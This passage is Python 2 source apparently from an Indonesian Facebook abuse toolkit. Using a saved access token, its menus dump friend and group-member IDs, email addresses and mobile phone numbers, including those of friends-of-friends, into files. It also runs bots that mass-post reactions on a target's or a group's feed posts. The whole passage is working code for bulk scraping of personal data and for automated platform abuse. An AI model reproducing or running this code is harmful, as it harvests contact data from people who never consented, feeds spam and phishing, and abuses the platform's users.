	print '\x1b[1;92m[\x1b[1;97m3\x1b[1;92m] \x1b[1;90mDump ID Members group'
	print "\033[1;97m[0]\033[1;97m Back"
	dump_pilih()
#-----pilih
def dump_pilih():
	cuih = raw_input("[?] pilih_>\033[1;97m")
	if cuih =="":
		print "\033[1;91m[!] Wrong input"
		dump_pilih()
	elif cuih =="1":
		id_teman()
	elif cuih =="2":
		idfrom_teman()
	elif cuih =="3":
		id_member_grup()
	elif cuih =="4":
		em_member_grup()
	elif cuih =="5":
		no_member_grup()
	elif cuih =="6":
		email()
	elif cuih =="7":
		emailfrom_teman()
	elif cuih =="8":
		nomor_hp()
	elif cuih =="9":
		hpfrom_teman()
	elif cuih =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		dump_pilih()
		
##### ID TEMAN #####
def id_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[•] \033[1;90mMengambil Semua ID\033[1;97m...')
		print 42*"\033[1;97m="
		bz = open('out/id_teman.txt','w')
		for a in z['data']:
			idteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;90m"+str(len(idteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m+\033[1;91m] \033[1;90mSukses mengambil ID \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;90mTotal ID \033[1;91m: \033[1;97m%s"%(len(idteman))
		done = raw_input("\r\033[1;91m[+] \033[1;90mSave Nama File\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman.txt','out/'+done)
		print("\r\033[1;91m[•] \033[1;90mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### ID FROM TEMAN #####
def idfrom_teman():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[•] \033[1;92mID Teman \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			

		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mSedang Mengambil ID friend \033[1;97m...')
		print 42*"\033[1;97m="
		bz = open('out/id_teman_from_teman.txt','w')
		for a in z['friends']['data']:
			idfromteman.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m•\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/id_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### ID FROM MEMBER GRUP #####
def id_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m+\033[1;91m] \033[1;92mname \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mgetting member group \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=id,name&limit=999999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			idmem.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']),;sys.stdout.flush();time.sleep(0.0001)
		bz.close()
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### EMAIL FROM GRUP #####
def em_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mGet group member email \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emmem.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emmem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emmem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### NOMER FROM GRUP #####
def no_member_grup():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		id=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+id+'&access_token='+toket)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		jalan('\033[1;91m[✺] \033[1;92mGet group member phone number \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_member_grup.txt','w')
		re=requests.get('https://graph.facebook.com/'+id+'/members?fields=name,id&limit=999999999&access_token='+toket)
		s=json.loads(re.text)
		for a in s['data']:
			x = requests.get("https://graph.facebook.com/"+a['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				nomem.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(nomem))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get phone number from member group \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(nomem))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_member_grup.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### EMAIL #####
def email():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('clear')
		print logo
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/email_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				em.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(em))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(em))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/email_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### EMAIL FROM TEMAN #####
def emailfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend email from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/em_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				emfromteman.append(z['email'])
				bz.write(z['email'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(emfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['email']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get email \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Email \033[1;91m: \033[1;97m%s"%(len(emfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/em_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()
		
##### NOMER #####
def nomor_hp():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mGet all friend number phone \033[1;97m...')
		print 42*"\033[1;97m═"
		url= "https://graph.facebook.com/me/friends?access_token="+toket
		r =requests.get(url)
		z=json.loads(r.text)
		bz = open('out/nomer_teman.txt','w')
		for n in z["data"]:
			x = requests.get("https://graph.facebook.com/"+n['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hp.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hp))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/nomer_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		keluar()

##### NOMER FROM TEMAN #####
def hpfrom_teman():
	os.system('reset')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.mkdir('out')
	except OSError:
		pass
	try:
		os.system('reset')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			dump()
		r = requests.get('https://graph.facebook.com/'+idt+'/friends?access_token='+toket)
		a = json.loads(r.text)
		jalan('\033[1;91m[✺] \033[1;92mGet all friend number from friend \033[1;97m...')
		print 42*"\033[1;97m═"
		bz = open('out/no_teman_from_teman.txt','w')
		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+toket)
			z = json.loads(x.text)
			try:
				hpfromteman.append(z['mobile_phone'])
				bz.write(z['mobile_phone'] + '\n')
				print ("\r\033[1;97m[ \033[1;92m"+str(len(hpfromteman))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+z['mobile_phone']+" | "+z['name']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
			except KeyError:
				pass
		bz.close()
		print 42*"\033[1;97m═"
		print '\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hpfromteman))
		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('out/no_teman_from_teman.txt','out/'+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except IOError:
		print"\033[1;91m[!] Error creating file"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except KeyError:
		print('\033[1;91m[!] Error')
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		dump()
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"
		menu()
def grupsaya():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	try:
		os.mkdir('out')
	except OSError:
		pass
	os.system('clear')
	print logo
	print 42*"\033[1;96m="
	try:
		uh = requests.get('https://graph.facebook.com/me/groups?access_token='+toket)
		gud = json.loads(uh.text)
		for p in gud['data']:
			nama = p["name"]
			id = p["id"]
			f=open('out/Grupid.txt','w')
			listgrup.append(id)
			f.write(id + '\n')
			
			print("\033[1;96m[•] \033[1;97mID  \033[1;91m: \033[1;92m"+str(id))
			print("\033[1;96m[•] \033[1;97mName\033[1;91m: \033[1;92m"+str(nama) + '\n')
		print 42*"\033[1;96m="
		print"\033[1;96m[•] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
		print("\033[1;96m[•] \033[1;92mSaved \033[1;91m: \033[1;97mout/Grupid.txt")
		f.close()
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except (KeyboardInterrupt,EOFError):
		print("\033[1;96m[!] \x1b[1;91mTerhenti")
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except KeyError:
		os.remove('out/Grupid.txt')
		print('\033[1;96m[!] \x1b[1;91mGroup tidak ditemukan')
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[✖] \x1b[1;91mTidak ada koneksi"
		keluar()
	except IOError:
		print "\033[1;96m[!] \x1b[1;91mError"
		raw_input("\n\033[1;96m[\033[1;97mKembali\033[1;96m]")
		menu()
def bot():
	print' '
	print '\x1b[1;93m[\x1b[1;91m1\x1b[1;93m] \x1b[1;90mBot Reactions Target Post'
	print '\x1b[1;93m[\x1b[1;91m2\x1b[1;93m] \x1b[1;90mBot Reactions Grup Post'
	print '\x1b[1;93m[\x1b[1;91m3\x1b[1;93m] \x1b[1;90mBot Komen Target Post'
	print '\x1b[1;93m[\x1b[1;91m0\x1b[1;93m] \x1b[1;90mBack'
	bot_pilih()
#////////////
def bot_pilih():
	bots = raw_input("\033[1;97m[?] pilih_>\033[1;97m")
	if bots =="":
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
	elif bots =="1":
		menu_react()
	elif bots =="2":
		grup_react()
	elif bots =="3":
		bot_komen()
	elif bots =="4":
		grup_komen()
	elif bots =="5":
		deletepost()
	elif bots =="6":
		accept()
	elif bots =="7":
		unfriend()
	elif bots =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		bot_pilih()
		
##### MENU REACT #####
def menu_react():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	react_pilih()
#//////////////
def react_pilih():
	global tipe
	aksi = raw_input("\033[1;97m>>>")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		react_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		react()
	elif aksi =="2":
		tipe = "LOVE"
		react()
	elif aksi =="3":
		tipe = "WOW"
		react()
	elif aksi =="4":
		tipe = "HAHA"
		react()
	elif aksi =="5":
		tipe = "SAD"
		react()
	elif aksi =="6":
		tipe = "ANGRY"
		react()
	elif aksi =="0":
		bot()
	else:
		print "\033[1;91m[!] Wrong input"
		react_pilih()
#####NEXT
def react():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Target \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		oh = requests.get("https://graph.facebook.com/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksi.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksi))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
	except KeyError:
		print"\033[1;91m[!] ID not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		bot()
		
##### BOT REACT GRUP #####
def grup_react():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print ("\033[1;92m1. \033[1;97mLike")
	print ("\033[1;92m2. \033[1;97mLove")
	print ("\033[1;92m3. \033[1;97mWow")
	print ("\033[1;92m4. \033[1;97mHaha")
	print ("\033[1;92m5. \033[1;97mSadBoy")
	print ("\033[1;92m6. \033[1;97mAngry")
	print "\033[1;91m0.\033[1;97m Back"
	print " "
	reactg_pilih()
#//////////////
def reactg_pilih():
	global tipe
	aksi = raw_input(">>>")
	if aksi =="":
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
	elif aksi =="1":
		tipe = "LIKE"
		reactg()
	elif aksi =="2":
		tipe = "LOVE"
		reactg()
	elif aksi =="3":
		tipe = "WOW"
		reactg()
	elif aksi =="4":
		tipe = "HAHA"
		reactg()
	elif aksi =="5":
		tipe = "SAD"
		reactg()
	elif aksi =="6":
		tipe = "ANGRY"
		reactg()
	elif aksi =="0":
		menu()
	else:
		print "\033[1;91m[!] Wrong input"
		reactg_pilih()
#####NEXT
def reactg():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	ide = raw_input('\033[1;91m[+] \033[1;92mInput ID Group \033[1;91m:\033[1;97m ')
	limit = raw_input("\033[1;91m[!] \033[1;92mLimit \033[1;91m:\033[1;97m ")
	try:
		r=requests.get('https://graph.facebook.com/group/?id='+ide+'&access_token='+toket)
		asw=json.loads(r.text)
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
	except KeyError:
		print"\033[1;91m[!] Group not found"
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		grup_react()
	try:
		oh = requests.get("https://graph.facebook.com/v3.0/"+ide+"?fields=feed.limit("+limit+")&access_token="+toket)
		ah = json.loads(oh.text)
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		print 42*"\033[1;97m═"
		for a in ah['feed']['data']:
			y = a['id']
			reaksigrup.append(y)
			requests.post("https://graph.facebook.com/"+y+"/reactions?type="+tipe+"&access_token="+toket)
			print '\033[1;92m[\033[1;97m'+y[:10].replace('\n',' ')+'... \033[1;92m] \033[1;97m'+tipe
		print 42*"\033[1;97m═"
		print "\r\033[1;91m[+]\033[1;92m Done \033[1;97m"+str(len(reaksigrup))
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		menu()
